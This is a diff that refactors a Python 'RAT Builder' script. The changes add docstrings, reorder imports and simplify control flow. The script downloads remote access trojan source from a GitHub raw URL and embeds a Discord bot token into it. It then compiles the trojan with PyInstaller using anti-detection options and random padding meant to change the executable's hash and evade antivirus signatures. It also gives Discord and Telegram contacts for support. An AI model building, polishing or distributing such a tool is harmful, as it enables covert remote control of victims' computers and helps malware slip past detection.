@@ -1,34 +1,34 @@
-import os
-import sys
-import requests
-import subprocess
-import shutil
 import hashlib
-import time
+import os
 import random
+import shutil
+import subprocess
+import sys
 from colorama import init, Fore, Style
 
 # Initialize colorama
 init()
 
 def print_banner():
+    """Print the application banner."""
     banner = f"""
     {Fore.RED}╔═══════════════════════════════════════════════════════════════════════╗
     ║ {Fore.CYAN}███████╗██╗  ██╗ ██████╗ ████████╗██╗ ██████╗ █████╗ ██╗     ██╗  ██╗{Fore.RED} ║
     ║ {Fore.CYAN}██╔════╝╚██╗██╔╝██╔═══██╗╚══██╔══╝██║██╔════╝██╔══██╗██║     ╚██╗██╔╝{Fore.RED} ║
-    ║ {Fore.CYAN}█████╗   ╚███╔╝ ██║   ██║   ██║   ██║██║     ███████║██║      ╚███╔╝ {Fore.RED} ║
-    ║ {Fore.CYAN}██╔══╝   ██╔██╗ ██║   ██║   ██║   ██║██║     ██╔══██║██║      ██╔██╗ {Fore.RED} ║
+    ║ {Fore.CYAN}█████╗   ╚███╔╝ ██║   ██║   ██║   ██║██║     ███████║██║      ╚███╔╝{Fore.RED} ║
+    ║ {Fore.CYAN}██╔══╝   ██╔██╗ ██║   ██║   ██║   ██║██║     ██╔══██║██║      ██╔██╗{Fore.RED} ║
     ║ {Fore.CYAN}███████╗██╔╝ ██╗╚██████╔╝   ██║   ██║╚██████╗██║  ██║███████╗██╔╝ ██╗{Fore.RED} ║
     ║ {Fore.CYAN}╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RED} ║
     ║                                                                           ║
-    ║ {Fore.GREEN}Exotically Flexing RAT Builder                                      {Fore.RED} ║
-    ║ {Fore.YELLOW}Created by: dead exotic & hoa                                       {Fore.RED} ║
-    ║ {Fore.CYAN}https://github.com/deadexotic                                        {Fore.RED} ║
+    ║ {Fore.GREEN}Exotically Flexing RAT Builder{Fore.RED} ║
+    ║ {Fore.YELLOW}Created by: dead exotic & hoa{Fore.RED} ║
+    ║ {Fore.CYAN}https://github.com/deadexotic{Fore.RED} ║
     ╚═══════════════════════════════════════════════════════════════════════╝
     """
     print(banner)
 
 def check_requirements():
+    """Check and install required modules if needed."""
     required_modules = ['discord.py', 'pycaw', 'comtypes', 'requests', 'pyinstaller', 'colorama']
     missing_modules = []
     
@@ -37,7 +37,7 @@ def check_requirements():
             if module == 'discord.py':
                 __import__('discord')
             else:
-                __import__(module.split('.')[0])
+                __import__(module.split('.', maxsplit=1)[0])
         except ImportError:
             missing_modules.append(module)
     
@@ -47,16 +47,16 @@ def check_requirements():
         if install.lower() == 'y':
             for module in missing_modules:
                 print(f"{Fore.CYAN}[*] Installing {module}...{Style.RESET_ALL}")
-                subprocess.run([sys.executable, "-m", "pip", "install", module])
+                subprocess.run([sys.executable, "-m", "pip", "install", module], check=False)
             print(f"{Fore.GREEN}[+] All required modules installed successfully!{Style.RESET_ALL}")
             return True
-        else:
-            print(f"{Fore.RED}[!] Please install the required modules and try again.{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
-            return False
+        print(f"{Fore.RED}[!] Please install the required modules and try again.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
+        return False
     return True
 
 def download_rat_source():
+    """Download the RAT source code from GitHub."""
     url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaa"
     try:
         print(f"{Fore.CYAN}[*] Downloading RAT source code...{Style.RESET_ALL}")
@@ -66,16 +66,15 @@ def download_rat_source():
                 f.write(response.text)
             print(f"{Fore.GREEN}[+] RAT source code downloaded successfully!{Style.RESET_ALL}")
             return True
-        else:
-            print(f"{Fore.RED}[!] Failed to download RAT source code. Status code: {response.status_code}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}[*] Using main1.py as fallback...{Style.RESET_ALL}")
-            try:
-                shutil.copy("main1.py", "rat_source.py")
-                print(f"{Fore.GREEN}[+] Using main1.py as RAT source code!{Style.RESET_ALL}")
-                return True
-            except Exception as e:
-                print(f"{Fore.RED}[!] Error using main1.py as fallback: {str(e)}{Style.RESET_ALL}")
-                return False
+        print(f"{Fore.RED}[!] Failed to download RAT source code. Status code: {response.status_code}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Using main1.py as fallback...{Style.RESET_ALL}")
+        try:
+            shutil.copy("main1.py", "rat_source.py")
+            print(f"{Fore.GREEN}[+] Using main1.py as RAT source code!{Style.RESET_ALL}")
+            return True
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error using main1.py as fallback: {str(e)}{Style.RESET_ALL}")
+            return False
     except Exception as e:
         print(f"{Fore.RED}[!] Error downloading RAT source code: {str(e)}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}[*] Using main1.py as fallback...{Style.RESET_ALL}")
@@ -88,6 +87,7 @@ def download_rat_source():
             return False
 
 def insert_token(token):
+    """Insert the Discord bot token into the RAT source code."""
     try:
         with open("rat_source.py", "r", encoding="utf-8") as f:
             lines = f.readlines()
@@ -118,6 +118,7 @@ def insert_token(token):
         return False
 
 def compile_rat(output_name):
+    """Compile the RAT source code into an executable."""
     try:
         print(f"{Fore.CYAN}[*] Compiling RAT...{Style.RESET_ALL}")
         
@@ -125,13 +126,11 @@ def compile_rat(output_name):
         if not os.path.exists("rat_source.py"):
             print(f"{Fore.RED}[!] rat_source.py not found. Cannot compile.{Style.RESET_ALL}")
             return False
-            
-        # Generate random version info
-        version = f"{random.randint(1, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
         
         # Add random data to the executable to change hash
-        with open("random_data.txt", "w") as f:
-            f.write(''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(1000, 10000))))
+        with open("random_data.txt", "w", encoding="utf-8") as f:
+            f.write(''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
+                           for _ in range(random.randint(1000, 10000))))
         
         # PyInstaller command with anti-detection options
         cmd = [
@@ -146,7 +145,7 @@ def compile_rat(output_name):
         ]
         
         # Run PyInstaller
-        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
         
         if process.returncode != 0:
             print(f"{Fore.RED}[!] Compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
@@ -171,17 +170,18 @@ def compile_rat(output_name):
                     os.remove("rat_source.py")
             except Exception as e:
                 print(f"{Fore.YELLOW}[!] Warning: Could not clean up some files: {str(e)}{Style.RESET_ALL}")
-                
+            
             return True
-        else:
-            print(f"{Fore.RED}[!] Compilation completed but executable not found.{Style.RESET_ALL}")
-            return False
+        
+        print(f"{Fore.RED}[!] Compilation completed but executable not found.{Style.RESET_ALL}")
+        return False
             
     except Exception as e:
         print(f"{Fore.RED}[!] Error compiling RAT: {str(e)}{Style.RESET_ALL}")
         return False
 
 def main():
+    """Main function to run the RAT builder."""
     print_banner()
     
     print(f"{Fore.CYAN}[*] Checking requirements...{Style.RESET_ALL}")
